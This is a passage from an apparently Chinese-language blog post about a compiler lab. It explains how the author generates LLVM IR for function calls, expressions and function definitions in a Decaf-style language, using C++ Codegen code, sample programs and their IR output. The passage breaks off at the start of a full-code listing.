<p>首先是上述案例，需要解决的问题就是对传参类型不同的处理：</p>
<ul>
<li>一开始我打算直接修改 <code>true</code> 的类型，但后来发现直接修改类型会对后续 <code>true</code> 的使用产生影响（具体而言是影响了 <code>llvm::Value</code>）</li>
<li>然后选择将函数参数的 <code>llvm::Value</code> 提取出来，根据函数定义所规定的传参类型新定义一个 <code>llvm::Value</code>，并使用该 <code>llvm::Value</code> 调用 <code>CreateCall</code></li>
<li>最后在查看实验文档时发现了零扩展函数 <code>CreateZExt</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">llvm::Value * <span class="title">decafFunCall::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    descriptor * des = get_symbol(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">    llvm::Function * llvm_func = des-&gt;func;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;llvm::Value *&gt; putsargs;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;llvm::Type *&gt; putstypes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; arg : llvm_func-&gt;args()) &#123;</span><br><span class="line">        llvm::Type* func_type = arg.getType();</span><br><span class="line">        putstypes.push_back(func_type);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> p:<span class="keyword">this</span>-&gt;get_para())&#123;</span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = (decafBinexp *)p;</span><br><span class="line">        llvm::Value* vt = <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">        llvm::Type* func_type = putstypes[i++];</span><br><span class="line">      </span><br><span class="line">        vt = Builder.CreateZExt(vt, func_type, <span class="string">&quot;zexttmp&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        if(exp-&gt;get_kind() != &quot;VariableExpr&quot;)&#123;</span></span><br><span class="line"><span class="comment">            llvm::ConstantInt* constantInt = llvm::dyn_cast&lt;llvm::ConstantInt&gt;(vt);</span></span><br><span class="line"><span class="comment">            if (constantInt) &#123;</span></span><br><span class="line"><span class="comment">                llvm::APInt apIntValue = constantInt-&gt;getValue();</span></span><br><span class="line"><span class="comment">                int intValue = apIntValue.getZExtValue();</span></span><br><span class="line"><span class="comment">                vt = llvm::ConstantInt::get(func_type, intValue);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125; </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        putsargs.push_back(vt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    llvm::Value *ret_value = Builder.CreateCall(llvm_func, putsargs);</span><br><span class="line">    <span class="keyword">return</span> ret_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：对返回类型的处理同理</li>
</ul>
<p>接着分析下一个样例：对于表达式的处理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> func <span class="title">print_int</span><span class="params">(<span class="keyword">int</span>)</span> <span class="keyword">void</span></span>;</span><br><span class="line"></span><br><span class="line">package foo &#123;</span><br><span class="line">    <span class="function">func <span class="title">main</span><span class="params">()</span> <span class="keyword">int</span> </span>&#123;</span><br><span class="line">        var flag <span class="keyword">bool</span>;</span><br><span class="line">        var a, b, c <span class="keyword">bool</span>;</span><br><span class="line">        var size <span class="keyword">int</span>;</span><br><span class="line">        a = <span class="literal">true</span>;</span><br><span class="line">        b = <span class="literal">false</span>;</span><br><span class="line">        c = <span class="literal">true</span>;</span><br><span class="line">        flag = a || b &amp;&amp; !c;</span><br><span class="line">        size = <span class="number">1</span> &gt;&gt; <span class="number">3</span> + <span class="number">1</span> / <span class="number">-2</span> % <span class="number">10</span> - <span class="number">5</span> * <span class="number">2</span> / <span class="number">20</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line">        print_int(size);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;foo&#x27;</span></span><br><span class="line">source_filename = <span class="string">&quot;DecafExpr&quot;</span></span><br><span class="line"></span><br><span class="line">declare <span class="keyword">void</span> @print_int(i32)</span><br><span class="line"></span><br><span class="line">define i32 @main() &#123;</span><br><span class="line">entry:</span><br><span class="line">  %flag = alloca i1</span><br><span class="line">  %a = alloca i1</span><br><span class="line">  %b = alloca i1</span><br><span class="line">  %c = alloca i1</span><br><span class="line">  %size = alloca i32</span><br><span class="line">  store i1 <span class="literal">true</span>, i1* %a</span><br><span class="line">  store i1 <span class="literal">false</span>, i1* %b</span><br><span class="line">  store i1 <span class="literal">true</span>, i1* %c</span><br><span class="line">  %a1 = load i1, i1* %a</span><br><span class="line">  %b2 = load i1, i1* %b</span><br><span class="line">  %c3 = load i1, i1* %c</span><br><span class="line">  %nottmp = <span class="keyword">xor</span> i1 %c3, <span class="literal">true</span></span><br><span class="line">  %andtmp = <span class="keyword">and</span> i1 %b2, %nottmp</span><br><span class="line">  %ortmp = <span class="keyword">or</span> i1 %a1, %andtmp</span><br><span class="line">  store i1 %ortmp, i1* %flag</span><br><span class="line">  store i32 <span class="number">0</span>, i32* %size</span><br><span class="line">  %size4 = load i32, i32* %size</span><br><span class="line">  call <span class="keyword">void</span> @print_int(i32 %size4)</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个案例主要展示了如何处理表达式</li>
</ul>
<p>其中最困难的地方就是区别：一元运算类，二元运算类，常量类，变量类</p>
<p>我的做法是令二元运算类 decafBinexp 继承常量/变量类 decafAllexp，然后将一元运算类 decafUnaryexp 当成特殊的 decafBinexp</p>
<p>最后在 <code>decafBinexp::Codegen</code> 中分情况讨论，对于不同的类进行不同的处理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">llvm::Value *<span class="title">decafBinexp::Codegen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == valueK)&#123;</span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)<span class="keyword">this</span>; </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == expuK)&#123;</span><br><span class="line">        llvm::Value *L = Exp1-&gt;Codegen();</span><br><span class="line">        <span class="keyword">if</span> (L == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">this</span>-&gt;get_op(Option)) &#123;</span><br><span class="line">            <span class="keyword">case</span> nottmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateNot(L, <span class="string">&quot;nottmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;     </span><br><span class="line">            <span class="keyword">case</span> negtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateNeg(L , <span class="string">&quot;negtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == expbK)&#123;</span><br><span class="line">        llvm::Value *L = Exp1-&gt;Codegen();</span><br><span class="line">        llvm::Value *R = Exp2-&gt;Codegen();</span><br><span class="line">        <span class="keyword">if</span> (L == <span class="number">0</span> || R == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">this</span>-&gt;get_op(Option)) &#123;</span><br><span class="line">            <span class="keyword">case</span> addtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateAdd(L, R, <span class="string">&quot;addtmp&quot;</span>); </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> subtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateSub(L, R, <span class="string">&quot;subtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> multmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateMul(L, R, <span class="string">&quot;multmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> remtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateSRem(L, R, <span class="string">&quot;remtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> divtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateSDiv(L, R, <span class="string">&quot;divtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ortmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateOr(L, R, <span class="string">&quot;ortmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> andtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateAnd(L, R, <span class="string">&quot;andtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> eqtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpEQ(L, R, <span class="string">&quot;eqtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> netmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpNE(L, R, <span class="string">&quot;netmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> slttmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSLT(L, R, <span class="string">&quot;slttmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">            <span class="keyword">case</span> sgttmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSGT(L, R, <span class="string">&quot;sgttmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> sletmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSLE(L, R, <span class="string">&quot;sletmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">            <span class="keyword">case</span> sgetmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSGE(L, R, <span class="string">&quot;sgetmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> shltmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateShl(L, R, <span class="string">&quot;shltmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">            <span class="keyword">case</span> shrtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateLShr(L, R, <span class="string">&quot;shrtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;                          </span><br><span class="line">            <span class="keyword">default</span>: </span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = <span class="literal">NULL</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == funcK)&#123;</span><br><span class="line">        decafFunCall * call = (decafFunCall *)<span class="keyword">this</span>; </span><br><span class="line">        <span class="keyword">this</span>-&gt;des.value = call-&gt;Codegen();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>其实就是把对 decafAllexp decafBinexp decafUnaryexp 的处理都整合到了 <code>decafBinexp::Codegen</code> 上</li>
<li>最后一个函数调用的处理其实是特殊情况，我为了方便就直接把它放到这个地方了</li>
<li>对于 “语句Stmt” 的处理也可以使用上述思路（本实验没有要求处理 “语句Stmt”）</li>
</ul>
<p>参考以下案例：对于函数定义和函数调用的处理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> func <span class="title">print_int</span><span class="params">(<span class="keyword">int</span>)</span> <span class="keyword">void</span></span>;</span><br><span class="line"></span><br><span class="line">package Test &#123;</span><br><span class="line">    <span class="function">func <span class="title">main</span><span class="params">()</span> <span class="keyword">int</span> </span>&#123;</span><br><span class="line">        test(<span class="number">10</span>, <span class="number">13</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">func <span class="title">test</span><span class="params">(a <span class="keyword">int</span>, b <span class="keyword">int</span>)</span> <span class="keyword">void</span> </span>&#123;</span><br><span class="line">        print_int(a);</span><br><span class="line">        print_int(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;Test&#x27;</span></span><br><span class="line">source_filename = <span class="string">&quot;DecafExpr&quot;</span></span><br><span class="line"></span><br><span class="line">declare <span class="keyword">void</span> @print_int(i32)</span><br><span class="line"></span><br><span class="line">define i32 @main() &#123;</span><br><span class="line">entry:</span><br><span class="line">  call <span class="keyword">void</span> @test(i32 <span class="number">10</span>, i32 <span class="number">13</span>)</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define <span class="keyword">void</span> @test(i32 %a, i32 %b) &#123;</span><br><span class="line">entry:</span><br><span class="line">  %a1 = alloca i32</span><br><span class="line">  store i32 %a, i32* %a1</span><br><span class="line">  %b2 = alloca i32</span><br><span class="line">  store i32 %b, i32* %b2</span><br><span class="line">  %a3 = load i32, i32* %a1</span><br><span class="line">  call <span class="keyword">void</span> @print_int(i32 %a3)</span><br><span class="line">  %b4 = load i32, i32* %b2</span><br><span class="line">  call <span class="keyword">void</span> @print_int(i32 %b4)</span><br><span class="line">  ret <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个案例有一个特点：在定义 <code>test</code> 前，先在 <code>main</code> 中调用了 <code>test</code></li>
<li>为了实现这个效果，我将 “函数定义” 的相关操作拆为两部分，分别放入 <code>decafFuncDef::Codegen</code> 和 <code>method_decl</code> 中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">llvm::Value *<span class="title">decafFuncDef::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    descriptor* des = get_symbol(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">    <span class="keyword">if</span>(check_symbol( <span class="keyword">this</span>-&gt;get_name(), funcK))&#123;</span><br><span class="line">        get_return = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        llvm::BasicBlock *BB = llvm::BasicBlock::Create(TheContext, <span class="string">&quot;entry&quot;</span>, <span class="keyword">this</span>-&gt;lfunc);</span><br><span class="line">        Builder.SetInsertPoint(BB);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> p:<span class="keyword">this</span>-&gt;get_para()-&gt;get_para())&#123;</span><br><span class="line">            <span class="keyword">this</span>-&gt;lfunc-&gt;getArg(i)-&gt;setName(p-&gt;get_name());</span><br><span class="line"></span><br><span class="line">            descriptor * des2 = <span class="keyword">new</span> descriptor();</span><br><span class="line">            <span class="keyword">if</span>(put_symbol(p-&gt;get_name(),des2))&#123;</span><br><span class="line">                des2-&gt;alloc = Builder.CreateAlloca(p-&gt;lType, <span class="number">0</span>, p-&gt;get_name());</span><br><span class="line">                des2-&gt;kind = valueK;</span><br><span class="line">            &#125;</span><br><span class="line">            Builder.CreateStore(<span class="keyword">this</span>-&gt;lfunc-&gt;getArg(i),des2-&gt;alloc);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        decafBlock * B = <span class="keyword">this</span>-&gt;get_block();</span><br><span class="line">        B-&gt;Codegen();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(get_return)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;lType-&gt;isVoidTy())</span><br><span class="line">                Builder.CreateRetVoid();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                Builder.CreateRet(llvm::ConstantInt::get(TheContext, llvm::APInt(<span class="number">32</span>, <span class="number">0</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;lfunc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">method_decl: T_FUNC T_ID T_LPAREN para_list_def T_RPAREN method_type block &#123;</span><br><span class="line">        decafFuncDef *func = <span class="keyword">new</span> decafFuncDef();</span><br><span class="line">        decafPara* para = (decafPara*)$<span class="number">4</span>;</span><br><span class="line">        decafBlock * block = (decafBlock*)$<span class="number">7</span>;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">6</span>;</span><br><span class="line">        func-&gt;put_name($<span class="number">2</span>);</span><br><span class="line">        func-&gt;put_type(type);</span><br><span class="line">        func-&gt;put_para(para);</span><br><span class="line">        func-&gt;put_block(block);</span><br><span class="line">        $$ = func;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        descriptor* des = <span class="keyword">new</span> descriptor();</span><br><span class="line">        <span class="keyword">if</span>(put_symbol( func-&gt;get_name(), des))&#123;</span><br><span class="line">            llvm::Type *returnTy = func-&gt;lType;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;llvm::Type *&gt; functionArgs;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> p:func-&gt;get_para()-&gt;get_para())&#123;</span><br><span class="line">                functionArgs.push_back(p-&gt;lType);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            func-&gt;lfunc = llvm::Function::Create(</span><br><span class="line">                llvm::FunctionType::get(returnTy, functionArgs ,<span class="literal">false</span>),</span><br><span class="line">                llvm::Function::ExternalLinkage, </span><br><span class="line">                func-&gt;get_name(), </span><br><span class="line">                TheModule);</span><br><span class="line">            <span class="keyword">if</span> (func-&gt;lfunc == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> runtime_error(<span class="string">&quot;empty function block&quot;</span>); </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            des-&gt;func = func-&gt;lfunc;</span><br><span class="line">            des-&gt;kind = funcK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure>
<p>完整代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span 